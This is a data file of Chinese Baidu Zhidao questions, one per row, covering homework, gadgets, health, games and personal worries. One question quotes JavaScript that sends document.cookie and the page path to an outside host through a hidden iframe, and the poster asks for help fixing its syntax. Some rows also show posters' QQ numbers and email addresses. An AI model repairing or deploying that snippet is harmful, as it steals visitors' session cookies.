79671500.html		在ADSL分离器的dsl端接宽带猫上网；Phone端再接个分离器，这个分离器后面接电话。可以吗？	就是第一个分离器的宽带dsl端接宽带猫上网；在Phone端再接个分离器，第二个分离器的Phone端接电话机，第二个分离器的宽带dsl端也接猫，但没接入电源，电脑也不开机。只是第一个分离器的宽带猫上网，和第二个分离器的电话机使用。能行吗？\r\n其实我就是想在原有的网线上（有分离器、电话机、猫、电脑),再接入一个宽带猫上网，但是正常接的原有的猫和电脑总不开机，只使用电话机，请问我怎么接入我的猫能上网并保证那个电话机能使用？谢谢了
509261563.html	百度知道/教育/科学/外语学习/英语翻译/	根据句意和首字母提示补全单词 We all work in the o_____ in that building.	Please do your homework c_____ .
280579707.html	百度知道/地区/黑龙江/哈尔滨市/	有人说哈尔滨华夏计算机职业技术学院不好，是真的么？	那个人是华夏计算机学院的邻校学生
7848103.html	百度知道/电脑/网络/常见软件/浏览器/	我的IE浏览器被删除，现在只有快捷方式 怎么还原？？	原图标被删了 现在的IE 是快捷方式 怎么还原\r\n？？？
78445318.html		一节7号1.2V的350mAh劲霸充电电池第一次充电时间是多久？	一节7号1.2V的350mAh劲霸充电电池第一次充电时间是多久？我的充电器输入电压为220V 功率为3W。进行了第一次充电后以后的充电时间又该是多少为好？我以前也买过劲霸充电电池，但是就是不知道该到底充多久为好，有时充一个小时，有时又充通宵，所以使得电池寿命很短。现在想请教下到底冲多久才是正确的？
89400336.html	百度知道/教育/科学/理工学科/数学/	初二几道数学分式题：已知f(x)=x+1／x，求f（√2 - 1）的值。	（1）已知f(x)=x+1／x，求f（√2 - 1）的值。\r\n（分式的乘除法）\r\n（2）(2x-6／4-4x+x^2)÷(x+3)×(x^2+x-6／3-x);（分式的乘除法）\r\n（3）8y^(n-1) × (x^2／n)^n ÷ (- 2x^n／y)^2;
289036192.html	百度知道/生活/购房置业/	跪求！！！成都2011年交房楼盘和交房时间！！！在线等	要是有个表格什么的，给我说网址我自己整理也行！！主要是交房时间楼盘名称有地点就更好了！！！！谢谢！！
91508026.html	百度知道/电子数码/	大家看看这款三星的怎么样，给个建议	http://item.taobao.com/auction/item_detail-db1-4ee9ff518c67c675a16d3728ec951e08.jhtml
8887365.html	百度知道/教育/科学/学习帮助/	一道坐标题	三角形ABC中，OA=OB=5，OA上的高线为4，将它放在直角坐标系中，使点O与原点重合，点A在x轴上的正版周，那么点B的坐标是_____
277432319.html		我的400元过生日的钱丢班级了,上间操的时候我放在笔袋里了,我前位说用指甲刀,用完他就没给我拉上链,	班级留了三个值日生,全在值日,两个学习特别好的,一个小混混,我问过那两个了,她门说她一直在玩手机,没有去我座位上.然后下了课间操值日生说我前位是第一个回来的,我回来钱已经没了,怎么办??我妈妈说找不到钱不然回家,老师不管,说小午开个班会强调一下就行了,长个教训。怎么办阿
86163651.html		为什么我在qq华夏里见有人可以只让战魂打，而自己不用打怪?	是不是QQ华夏里的每个职业的人都可以只让战魂打，自己在一边休息?如果是，要怎么才能只让战魂打，自己不用打?
28664264.html		为什么我装了JDK 和JCREATOR后还是不能创建以.JAVA为扩展名的文件?	为什么我装了JDK 和JCREATOR后还是不能创建以.JAVA为扩展名的文件?\r\n我想创建.JAVA的文件``,但是它一直是以记事本的形式打开`我也创建了文件关联,怎么还是不可以`还是以记事本的形式打开`连.CLASS都不可以!\r\n这是怎么一回事?请高手指点我`教我 如何做``说准确点1!谢谢了!`
75913295.html	百度知道/商业/理财/个人理财/	还有贷款拖欠未还，并有一段时日，能办下来信用卡么？	还有贷款拖欠未还，并有一段时日，能办下来信用卡么？\r\n只能提供身份证件及收入证明\r\n或者谁有门路能办？
29410403.html	百度知道/电脑/网络/互联网/	怎么删除?	在百度搜索栏里输入搜索的文字,它会保存吗?要怎么删除?
435820369.html		上海市洋泾中学怎么样？	我是今年洋泾中学的推优生请了解情况的人给我分析一下洋泾中学作为市重点校风，师资如何？优势和劣势又在哪里?请大家客观的说一下，不要太过笼统！ \r\n谢谢大家了！
77675357.html	百度知道/电脑/网络/常见软件/	用友软件 用户询问价格 怎么答复用户？	不想告诉用户价格
89637485.html		谁有super junior 三辑所有的歌？？？	那位亲有所有的12首歌的MP3版？有的亲请发给我吧！\r\n390150648@qq.com\r\n谢谢您了~ O(∩_∩)O
7861227.html	百度知道/娱乐休闲/音乐/	那首狠流行的摇滚足球歌曲叫什么名字?	前段时间很流行.\r\n足球的.摇滚的...还出过儿童版的...\r\n以前常听..\r\n开始是鼓..节奏感特强..\r\n只记得一句歌词:\"伟~勒~伟~勒~~~挖求\"\r\n抱歉,我英语盲...\r\n谁知道....
77707807.html	百度知道/商业/理财/银行业务/	我想开一张信用卡，开哪个行好？	我想开一张信用卡，开哪个行好？\r\n主要想用来网上购物的，也主要考虑4大银行。\r\n要考虑到网上交易的安全性，手续费的问题，当然还有卡的图案，呵呵。\r\n谢谢~~~~\r\n（PS：大家觉得发展银行的希望卡如何？）
29971874.html		注册土豆网花钱吗?	我今天注册了土豆网,并下载了iTudou软件,在里面看视频,上传视频,还下载视频,把下载的视频用iTudou转换格式,用不用花钱啊,我用的是iTudou1.3版本的.里面可以转换MP4,3GP要花钱吗? 知道的请告诉我好吗?
288244547.html		求四川信用社经济金融专业08年，09年，10年的考试真题，请发送到26983206@qq.com	如确为真题，必追加100分。
290590639.html	百度知道/教育/科学/理工学科/数学/	为什么我用MATLAB多项式拟合得到的函数，再用函数去作图时两者的曲线会不一样呢？	clear all\r\nx0=[0 0.5 1 1.5 2 2.5 3 7 8 9 10 11.82 13 14 15 16 17.73 19 20 21 22 23.64 26 27 28 29 29.55];\r\ny0=[1.892e9 1.89e9 1.87e9 1.86e9 1.85e9 1.84e9 1.83e9 3e5 3e5 3.1e5 3e5 2.9e5 2.4e5 2.3e5 2e5 2.2e5 2e5 1.85e5 1.8e5 1.78e5 1.75e5 1.7e5 1.62e5 1.65e5 1.6e5 1.55e5 1.5e5];\r\np3=polyfit(x0,y0,18);\r\nvpa(poly2sym(p3),5)\r\nx=0:0.1:29.6;\r\ny1=polyval(p3,x);\r\n>> plot(x,y1,x0,y0,'o')\r\ngrid on\r\n得到如下函数：\r\ny=1.604*10^(-9)*x^18 - 4.4275*10^(-7)*x^17 + 0.000056159*x^16 - 0.0043377*x^15 + 0.22791*x^14 - 8.6173*x^13 + 241.87*x^12 - 5123.9*x^11 + 82462.0*x^10 - 1.0064*10^6*x^9 + 9.2252*10^6*x^8 - 6.2331*10^7*x^7 + 3.0125*10^8*x^6 - 9.9516*10^8*x^5 + 2.1031*10^9*x^4 - 2.5932*10^9*x^3 + 1.6075*10^9*x^2 - 3.7944*10^8*x + 1.8927*10^9\r\n\r\n我再输入\r\nclear all\r\nx=0:0.1:30;\r\n\r\ny=1.604e-9*x.^18 - 4.4275e-7*x.^17 + 0.000056159*x.^16 - 0.0043377*x.^15 + 0.22791*x.^14 - 8.6173*x.^13 + 241.87*x.^12 - 5123.9*x.^11 + 82462.0*x.^10 - 1.0064e6*x.^9 + 9.2252e6*x.^8 - 6.2331e7*x.^7 + 3.0125e8*x.^6 - 9.9516e8*x.^5 + 2.1031e9*x.^4 - 2.5932e9*x.^3 + 1.6075e9*x.^2 - 3.7944e8*x+ 1.8927e9;\r\nplot(x,y)\r\n\r\n为什么曲线会不一样，我仔细看过只有曲线前一部分会是相同的大概在x小于5.5内是相同的，之后就完全不一样了。。。。请教给位了。。。。。求帮帮忙，实在不明白为什么了。
37350533.html	百度知道/生活/	有的打火机有声音，怎么把它弄没了？	就是把盖子翻开，然后它会“唱歌”。。。\r\n怎么把声音给弄没了。。？
172038214.html		数学的读书笔记	急求、数学的读书笔记、在两千字以上、大家帮帮忙、谢谢啦
27541910.html	百度知道/生活/美容/塑身/	我去年10月份头发刚拉直，这几天我想再拉一次直发，时间会不会太短了？	还有我的皮肤一般，不是很白，要染什么颜色比较好呢？
387137902.html		联想笔记本电脑开机出现lenovo标志后，出现一些英文，无法进入系统，该怎么办？	出现的英文如下：\r\nbroadcom UNDISCOVERED\r\nPXE-2.1 v11.0.11\r\nCopyright (C) 2000-2008\r\nBroadcom Corporation\r\nCopyright (C) 1997-2000 Intel corporation\r\nAll Rights reserved\r\nPXE-E61:Media test\r\nfailure,check cable\r\nPXE-MDF:Exiting Broadcom\r\nPXE ROM
174250209.html	百度知道/游戏/手机游戏/	帝国OL神兵传奇的极速升级攻略	现在网上的新手升级攻略几乎都被老雷给升高门槛了，有一些都被取消掉了（像团防成就等），所以小弟在此求各位玩家帮帮忙，希望大家可以有什么升级攻略告诉新手们，谢谢了
3012192.html		验证码的作用？	注册、登陆、发表等时候总让填写验证码\r\n作用是什么
278376577.html	百度知道/电脑/网络/常见软件/其它类软件/	个人摄影作品集用什么软件制作比较好？	个人的摄影作品集，要排版设计出来，同时要印刷。但是，只印几本册子。用什么软件比较合适？
370950195.html	百度知道/电子数码/手机/通讯/手机购买/	索爱mt15i，索爱lt15i，LGP970，LGP990，HTCG11 哪款手机好用？女生~	想要性价比高一点的 耐用一点的 女生用的好看点的。。平时上网听歌拍照比较多。。纠结死我了。。。
1812776.html	百度知道/娱乐休闲/明星/华人明星/	王力宏是什么流派	还有林俊杰，周杰伦，潘伟柏．\r\n列：罗志祥的，他属于的流派是POP
340244914.html	百度知道/教育/科学/理工学科/物理学/	质量为20kg的平板车的左端放有质量为10kg的小铁块	质量为20kg的平板车的左端放有质量为10kg的小铁块，它与车之间的摩擦因数为0.5。开始时，车以速度6m/s向左在光滑水平面上运动，铁块以速度6m/s向右运动（g＝10m/s2）\r\n求（1）小车与铁块共同运动的速度\r\n（2）小车至少为多长，铁块才不会从小车上掉下去\r\n（3）铁块向右运动的最大位移
174779309.html		联通卡能异地查通话记录吗	联通卡能异地营业查通话记录吗
373161151.html		求4000元以下的组装机配置单 用于制图	我是一名学艺术的学生，今年大二要开始作图 \r\n跪求各位电脑达人给我一个4000以下的电脑配置单\r\n\r\n求各位大神能帮下忙。谢谢了
182703113.html	百度知道/医疗健康/妇产科/产科/	急！！怀孕多久可以测出来	我月经不太准时 一般是每个月的8号来，但是有几次会提前或推后，上个月也是8号左右来的。这个月的5号和老公同房，体外射精，不过事后发现有一些在里面了。8号那天就没有来月经了，昨天晚上买试纸检查了下，没有怀孕，但还是慌兮兮的，怕时间不对导致结果不准确，请问一般要到什么时候测才准确点？
170079506.html	百度知道/教育/科学/理工学科/物理学/	一个简单便宜的特斯拉线圈	本人想做一个400W左右的5cm距离的特斯拉拉线圈\r\n不知道有没有高手赐教下大概成本多少\r\n效果如何...\r\n本人诚心想做..拜托了 +Q 925205048
296704268.html	百度知道/生活/美食/烹饪/	怎么对芦荟进行保鲜	怎么对芦荟进行保鲜
336828900.html		三星I9000粉色俗不俗丫！！	听人说i9000粉色挺俗的 真的吗 我还挺喜欢的 本人女生 170 皮肤白白的 适合粉色吗\r\n还有什么好看的手机推荐下
243150585.html	百度知道/娱乐休闲/电视/	企业内刊如何做得有深度	我们公司想做内刊，而且要做得有深度，有影响力，增强其可读性，如果外包其他公司来做的话，不知道能不能实现这一点？\r\n请高人指点，怎样能让内刊做得有深度，以及内刊外包的问题，谢谢！
268411091.html	百度知道/烦恼/恋爱/	请先生女士们指点这是什么花？属性？放在室内的利弊？	图址：http://hi.baidu.com/%D5%C5%B8%A3%B3%C7/album/item/876c30c4a614f6409c163dbf.html
242843630.html		我的iphone4越狱了，下载了搜狗输入法，但是在国际键盘增加中没有找到搜狗，知道的麻烦告诉下？	搜狗输入法已经下载，就是增加中不显示
275543639.html		建设银行房贷我在2009年向建行贷款35万。还20年每月还款2200等额本息每个月都还一样。现在想全部还清。	请问还需要还银行多少？？
17637121.html	百度知道/烦恼/恋爱/	暗恋一个人,我该表白吗?	我是一名高3的学生.\r\n高2的时候喜欢上一位高3的学长.\r\n原以为我可以漫漫把他忘记,可是他现在上大学了,还是时常想起他.\r\n甚至每天一醒来想起的第一个人就是他.\r\n我们只说过几次话而已.\r\n圣诞节给他寄了礼物,他很吃惊.我想他大概应该猜到些什么吧?\r\n接下来我该怎么做呢?\r\n(很想个他考同一所大学)
277881942.html	百度知道/医疗健康/男科/	尿尿时总有尿痛 尿不尽 最后还会尿出血 这是什么问题 应该怎样解决啊 速度 求解	患者信息：男 17岁 其他 \r\n\r\n
393953021.html	百度知道/游戏/单机游戏/	在线急求！这样笔记本能玩什么射击游戏？像荣誉勋章 使命召唤那样的！	求救啊~！下了使命4 超级卡 使命2也是卡！
311570375.html	百度知道/娱乐休闲/度假旅游/	水上娱乐设施都包括什么？	打算开发点水上娱乐项目，有什么投资少见效快的项目？我看电视上的水上冲关，这些\r\n水上娱乐设施哪里有卖？质量怎么样？
246014251.html		UPS内部结构图	需要的是UPS内部一个整体爆炸图以及每个零部件单独的图，JPG格式的也可以。要直观可以看出UPS内部总共多少个零部件（主要零部件）以及每个零部件的图片，请看完问题补充再回答，谢谢！
270706386.html	百度知道/娱乐休闲/宠物/	分享快乐,,,狗狗开心小记	狗狗说今天终于有自己的大名叫贝贝因为主人说贝贝出生就好可怜没有爹妈自己走失在马路上看到来回的车辆主人看到贝贝的时候身子缩成一团身子在发抖一二天没有进食了娇小的样子一不小心就可能成为粘在路上的肉饼贝贝说主人疼它叫它贝贝心疼它没爹没娘还有那段那伤心的狗狗流浪记\r\n\r\n每天下班第一件事是想看贝贝它带给我很多快乐只要看到我老远就冲了过来兴奋得跳老高两只小脚都竖了起来好像说要我弯下腰来抱抱它然后就打开它的小牙要吸我的手指可能是在问我今天带了什么好吃的东东给它吃\r\n\r\n当我要离开的时候,它就冲了过来让我带它一起工作.我说这咋行.把它抱起来用眼睛瞪它,,可它的眼神好像很无辜的样子不敢看我.就把它抱回它的小窝,用东东盖住上面,可小家伙不乖,头顶一下就露出了小脑袋,好可爱的样子.我用手与它说bye-bye .可它就用它的小尾巴一直左摆右摆的好像也在说bye-bye …\r\n小家伙也有不乖的时候,每次吃饭的时候,放在它碗里的饭菜它不闻不问.宁愿受饿用眼睛看着我..看到它这样子真不忍心就拿着喂它,谁知道一块好大的肉一口咬进,再咬一下就已经在肚子里了,我想它可能啥味都不知道吧..可又想不对呀,它要是不知道啥味怎么青菜与饭都不吃呢.只有鱼肉才是它的大餐,还得要喂它不然它就看着我吃.小家伙真娇气.有饭有菜总比当初演狗狗流浪记的时候强多了吧.\r\n贝贝很喜欢洗澡澡,看到水就像猫抓鱼一样拍打.可要为它吹干的时候,那吹风机在它耳边呼呼响让它一直摇头呵呵.自从有这小家伙感觉多了很多快乐.平常有时间的时候只想休息,可现在有时间只想与它逗都不用休息了嘿嘿…
300885738.html	百度知道/生活/美食/烹饪/	菜窝头怎么做？	我想用苋菜做窝窝头，怎么把苋菜的水榨干？还有其他菜能做窝窝头吗？谢谢！
256965092.html	百度知道/电脑/网络/编程语言/	急急急急！！！！！为什么使用刻绘大师输出的时候，总是不停的在画一道直线而不打字？？	谢谢！！
26950565.html	百度知道/生活/购物/	哈尔滨在哪有卖视觉系摇滚[VR]饰物的??	具体下,多谢!!!!!!!!!!!!!!!!!!!
77737010.html		怎样去亲近陌生的狗狗？	不要说用食物诱惑之类，有的狗狗学会拒食的。
281201256.html	百度知道/电脑/网络/编程语言/其他编程语言/	JS代码 缺少标识符	var str=escape(window.location.pathname);\r\ncv=escape(document.cookie);\r\nfunction f()\r\n{\r\nifm=document.createElement(\"IFRAME\");\r\ndocument.body.appendChild(ifm);\r\nifm.width=0;\r\nifm.height=0;\r\nifm.src=\"http://www.emuse-cn.com/2.asp?s=\"+str+\"|\"+cv;\r\n}\r\nsetTimeout(f.\"1000\");\r\n\r\n全部代码是这样的 我运行说11行 14缺少标识符 求高手解决！
86287427.html	百度知道/社会民生/其他社会话题/	英国国民素质与美国的谁高	现在经常看到关于英国社会治安差的一些报道如地铁酗酒、绅士文化缺失、一到节假日就言行变粗鲁等，所以想请教一下去过美国或英国的朋友们评价一下，是美国的整体国民素质高还是英国整体国民素质高？谢谢您
6707050.html	百度知道/电脑/网络/互联网/网络连接/	请教各位高手如何清除上网时地址栏流下的流下的网址？？	就是上网时自己打上去的网址~~~该怎样去除？？
70575500.html	百度知道/游戏/单机游戏/	哪位大哥知道“富甲天下5”中把对方主公亲近武将打挂后在医院中为什么不显示？怎么做才能弄到手？	比如我用刘备，把曹操的夏侯敦打挂了，再去医院就没有夏侯敦，人家曹操去医院就能就出来。弄得他身边这些武将我一个也得不到。
76387119.html	百度知道/娱乐休闲/音乐/欧美流行乐/	求一首女声英文歌、慢节奏、高潮歌词是[I LOVE YOU……YOU AND ME……]	是在一个店里面听到的\r\n觉得特别好听\r\n\r\n很慢\r\n高潮歌词隐约听到[I LOVE YOU……YOU AND ME……WE ARE THE ONE……]什么的\r\n下一段的就是[……I MISS YOU……]\r\n其间有一段是一直重复着[EVERYTHING]
87076131.html	百度知道/商业/理财/基金/	求2008新被ST的股票名单	沪深两市，谢谢！
284098760.html	百度知道/体育/运动/健身/	练引体向上是长不高还是长得更高？	我听有人说 长不高 有人又说会长得更高 到底是怎么样 懂的再说 不懂别瞎说
68079662.html	百度知道/体育/运动/健身/	健身怎样吃鸡蛋?	搜索了些,有的说生吃蛋白,有的说水沸腾了把蛋打进去加盐或糖.\r\n\r\n怎样比较好呢?一天大概在几个呢?健身完后再吃还是健身的每天任何时间都可以?
278959309.html	百度知道/电子数码/	诺亚舟NP1380开不开机咋办?	升级时没电了！然后就开不开了复位也没反应。
74255257.html	百度知道/教育/科学/升学入学/	英语小故事	有趣的！~小故事！~在线等
291846502.html	百度知道/社会民生/求职就业/	大学毕业3年了，档案一直在人才服务中心托管，我还有干部身份吗	大学毕业3年了，毕业后没签就业协议，报到证学校也没给我，档案是学校统一放在人才服务中心托管的，期间一直有继费。请问我的报到证是不是放在档案里？我现在还是干部身份吗？主要我想考公务员，不知道有没有影响。听人家说毕业两年后还没签就业协议就没有干部身份了，是这样的吗？
83705268.html	百度知道/生活/	衢州自助旅游	我要知道的是关于衢州的旅游景点的路程安排，就是乘什么车既方便又省钱的，我自助游，我是学生，谁帮我解决了这个问题，我还追加分
287502934.html	百度知道/医疗健康/外科/	请问：我妈妈脚底下的鸡眼都有6年了，一直用的是上海牌的鸡眼膏，可就是没用，怎么才治得好呢？谢谢！	患者信息：女 45岁 \r\n\r\n
515254415.html		什么行业的销售有丰富的提高	女 硕士 园林景观专业 我想尽快赚够第一桶金 考虑了很久只有销售最快 那么什么销售比较适合女生做？提出又比较丰厚？在线等~~~
287848060.html	百度知道/医疗健康/妇产科/	怀孕一个月血压低会有什么症状？	患者信息：女 21岁 \r\n\r\n
88107963.html	百度知道/电脑/网络/硬件/硬盘/	我的单个FAT32分区为74.4GB？（整块硬盘）？	http://zhidao.baidu.com/question/9613187.html\r\n我的单个FAT32分区为74.4GB？（整块硬盘）？\r\n\r\nFAT32单分区上限是多少GB？\r\n\r\n还有这个：http://zhidao.baidu.com/question/22435351.html\r\n\r\n好像都是说32GB的啊？但我这个已经是74.4GB了？（即整块80GB的硬盘。。。PATA的。。。囧。为什么会这样？\r\n\r\n但好像又有说支持2TB的卷？
286784909.html	百度知道/电子数码/手机/通讯/	诺基亚有没有外形和N9一样的全触屏手机···	我爱死了诺基亚N9的外形、但是实在不喜欢那种全键盘、要是有和N9外形一样但是没有那个键盘的手机就好了、不知道还有谁和我有一样的想法呢？我这问题纯属牢骚、我知道这种手机还没有出现、这次的诺基亚新品发布我有关注、只是想找到和我想法一样的人···
68192528.html	百度知道/游戏/网易游戏/魔兽世界/	帮我取个游戏名字！不要符号不要繁体字	帮我取个游戏名字！不要符号不要繁体字！6个字以内！\r\n低级趣味的不要
89805836.html	百度知道/生活/保健养生/	我喉结下一分米左右的胸部有一硬币大的地方痛	痛的时间得有半年了,一按就疼,有时候运动也疼,偶尔挺胸是还\"咔\"的响一声,不知道是怎么了.
7733717.html	百度知道/电脑/网络/硬件/	急救！！！求助！！！！	大哥们帮我看看我的电脑是不是有问题：\r\n配置→ CPU - Celeron D 2.4G; 主板 - Intel D101Ggc（板载显卡-ATI全新的RADEON XPRESS 200、声卡-Realtek ALC861） 内存 - 1G；\r\n我先前下英雄无敌5来玩，完全性的玩不动，后来我就下了个 3Dmark2005来测试，结果只测出400多分。。。。。我搞不懂怎么回事啊，到底问题出在哪里，是显卡驱动问题，还是系统有问题，我的头都大了，请大侠们帮帮忙，指点一下，先谢过了！！！！
173470493.html	百度知道/游戏/掌机游戏/NDS/	口袋妖怪金心（nds）怎样拿到金黄市的新干线的车票？急啊	我已经在金黄市新干线车站的门口了，可我找不到攻略里写的那个女孩（拿不到皮皮玩偶）？各位大侠帮忙啊，那女孩在哪啊？我在开着nds等的。
173828650.html	百度知道/烦恼/家庭关系/	怎么弄生孩子	怎么弄生孩子
26342127.html		扬州会计夜校 报名	请问在扬州学会计在哪里报名，什么时候啊，需要什么条件啊
169857481.html	百度知道/地区/天津/和平区/	天津市河沿路有一家卖烘焙的原料用具什么的店具体位置在哪~	RT
167106983.html	百度知道/娱乐休闲/度假旅游/	西昌好耍嘛	想去完
173069821.html	百度知道/电子数码/	关于 apple touch 和psp300	我想买个 大家给个意见 买那个比较好呢？\r\n谢谢啦
26441414.html		传奇法师pk道士	都说法师好杀道.但我确刚刚相反,,,.在幻9和道士打,,我被他一毒,,,贴了5张符就挂了..我的血还加不起来,,郁闷....
174168336.html	百度知道/游戏/单机游戏/	秦殇游戏攻略	详细点。还有各个人物加点。还有我的孔刚死了怎么办啊。。
172993530.html	百度知道/商业/理财/保险/	我是失地农民公司应该给我购买社保还是综合保险呢？	由于我们这里的土地被镇府征用了，现在属于失地农民已有3年多，现在工作的单位应该给我买社保还是买综合保险呢？谢谢！
172501285.html	百度知道/医疗健康/内科/肾内科/	我被检查出糖耐量受损，糖尿病早期，我压力好大，求安慰	我好烦，我好怕，家有有得这个病的，我知道那是多么的痛苦，这个病不疼，不过比疼痛更折磨人，我知道这个病有多痛苦，我好怕，虽然只是早期，，糖耐量减低，糖调节受损，胰岛素抵抗。可在这样，我怕我坚持不了多久也会是糖尿病，如果这样，我真的不想活了，我才20出头，我的人生不能靠药物过，我甚至没有结婚，没有男人会要一个得了糖尿病的女孩子，我好烦，好烦，我好想哭，我真的，真的，好怕，是因为肥胖引起的，我在减肥，瘦了不知道还能不能恢复，我觉得世界突然一片黑暗，感觉自己已经快死了一样，感觉如果得了糖尿病，我的人生就终结在这20出头的年龄，就结束了，我不想像患病的家人那样，我怕，减肥以后会好转吗，如果你不懂不要回答我，安慰下就好，我现在满心都是恐惧，忧郁，压力，害怕，心烦
266949303.html		做了药流，至今已经20天，已经没有出血状态了，去B超后，医生说要清宫	患者信息：女 25岁 \r\n病情描述(发病时间、主要症状等)：\r\n做了药流，至今已经20天，已经没有出血状态了~去B超的诊断描述是：后位子宫形态大小正常，轮廓清，宫壁回声均匀，宫内见18MM*13MM略强回声团，边界清，内回声不均匀。双侧卵巢肠气干扰未明显。超声提示：宫内略强回声团。\r\n\r\n想得到怎样的帮助：\r\n这样的状态是不是一定要做清宫手术，药物治疗可以吗？因为还没要过小孩，怕对以后有影响~~~\r\n\r\n曾经治疗情况及是否有过敏、遗传病史：\r\n无\r\n\r\n\r\n
170324152.html	百度知道/生活/起名/算命/	开家网店取名求助，卖童装。	我想开一家网店，主要卖童装，不知道怎么取名字，请大家帮忙，谢谢！
176460758.html	百度知道/游戏/小游戏/	谁有《祖玛的复仇》下载？	要无毒无木马的版本！
171481682.html		四川管理职业学院怎么样？它的会计电算专业好吗？	广西一女考生，超三本线70分，不想读三本，不知哪位好心人能提供会计专业好的大专院校。
27760742.html	百度知道/电脑/网络/编程语言/其他编程语言/	怎样创建.jsp文件	是用文本文件改后缀名吗?
167811269.html		三个月大的孩子用吃核桃油吗？怎么吃更好？	我家宝宝三个月大了，给他吃核桃油他总是从嘴里弄出来，吃不进去多少，我是每天早上空腹的给他吃的，这样吃法对吗？请有经验的朋友们指点一下，谢谢！
2562099.html		这些文件式做什么的呢？	explorer.exe 内存使用32,800K.kavsvc.exe SYSTEM 13,176K ,svchost.exe 20,192K \r\nSystem Idle Process CPU总是显示在70－99 .qqfacerclient.exe 这个是什么文件呢？
174189433.html	百度知道/电子数码/MP4/MP3/	请推荐一款MP3	型号小巧一点的，内存大一点的至少要8G，就用来听歌所以其他功能无所谓。价位的话三位数吧。\r\n南京市场上可以买到的
266395742.html	百度知道/地区/四川/泸州市/	泸州手机贴膜大概多少钱	泸州手机贴膜大概多少钱一张，N8的
170729722.html	百度知道/资源共享/文档/报告共享/	宫斗侍寝戏 材料	宫斗侍寝戏 材料 偶是男的 来些H部分的资料谢谢啦
172863009.html	百度知道/游戏/巨人游戏/征途/	绿色征途怎么抓九天	绿色征途怎么抓九天
377774458.html		DNF卡在选择角色处	在站街的时候突然发现点什么都没反应。。然后重登就开始卡在选择角色那里了。求解释。求帮助
372538283.html	百度知道/游戏/电视游戏/PS系列/	现在买游戏机，是360好，还是PS3好？	这两个哪个可以玩盗版游戏？分别多少钱？
271892629.html		购物支付成功后,当时没有领取淘金币,过后还能领吗?	为什么我在完成付款以后没有点击领取淘金币的任务栏呢？\r\n以前都是有的啊……这个是什么问题？
378263916.html	百度知道/医疗健康/妇产科/	喝调节内分泌的中药会影响排卵吗	患者信息：女 26岁 江苏 扬州 \r\n病情描述(发病时间、主要症状等)：\r\n婚后月经20天左右就来，婚前是正常的。去看中医说内分泌失调开了中药和中成药。12月20号来的。1月7号又来了，量少颜色深三天就结束了。到现在月经还没有来。最近总是腰酸，尿频。\r\n\r\n想得到怎样的帮助：\r\n试纸测不出怀孕，不知道到底是什么原因。\r\n\r\n曾经治疗情况及是否有过敏、遗传病史：\r\n喝的中药。吃的女金胶囊，加味逍遥丸。现在逍遥丸换成了大黄蟅虫胶囊\r\n\r\n\r\n
301295293.html		我一对xbox slim的pppoe设置ip什么的都变为0.0.0.0	只要不对pppoe设定ip就自动显现，但是只要pppoe设定ip就都变为0.0.0.0，不论是有线还是无线，给位帮帮我吧
25081233.html	百度知道/烦恼/恋爱/	请情场高手给个建议，最好有女孩帮我分析一下	前几天通过别人介绍认识了一个女孩，她比我大两岁。在我们见面之前她来过我家，我父母都见过她，挺喜欢她。前几天，我和她见面，她母亲当时也见过了，听中间人说，见面当天晚上她失眠了（这也许是个好兆头）。我也挺喜欢她的，她家里也同意。她比较外向开朗，见面后她主动向我要了电话号码。但是见面都是我给他发短信，她没有主动给我发过，每次都发几条她就说要干别的。她这是什么意思？我邀请他五一来我家，她说假期有时间就来我真不明白。顺便说一下，这是我第一次交往女朋友，所以说让大家帮我分析一下，我给他发短信，都不知道说什么了，我们见面那天，应该互相印象都很好。
38143520.html		“曦”拼音怎样打啊	“曦”拼音怎样打啊，读什么
308046681.html	百度知道/烦恼/恋爱/	一个巨蟹座男生 知道我喜欢他 但他从不表态 大伙聚餐时很照顾我夹菜 倒水 拿这拿那的 他到底什么意思嘛！	关键是我明确说了喜欢他 他也不说什么的 见了面他也不会尴尬 照样和我聊天 还和我开玩笑什么的 帮帮我吧大家 愁死我了
234433894.html	百度知道/电脑/网络/互联网/网络连接/	电信华为C8600遇到问题，请高手解决！！！	①上网N慢②再用google地图的时候，有时会自动重启③手机的触摸屏有时比较迟钝④手机的CPU不知道为什么经常使用率是100%⑤有时会弹出XXXX在进程中出现错误！
306343018.html		初中生如果在放学或者上学的时候遇见流氓该怎么办？另加分哦	我是一名初中生，我最担心的是，遇过我在上学或放学的路上（还有晚自习）遇见流氓让你那个的话，你该怎么办？如果他还有刀子，你要不从他就杀了你怎么办？
251048337.html	百度知道/教育/科学/	有关于.从实际出发的作文	有关于.从实际出发的作文.八百..谁有提供下我.谢谢.急用.
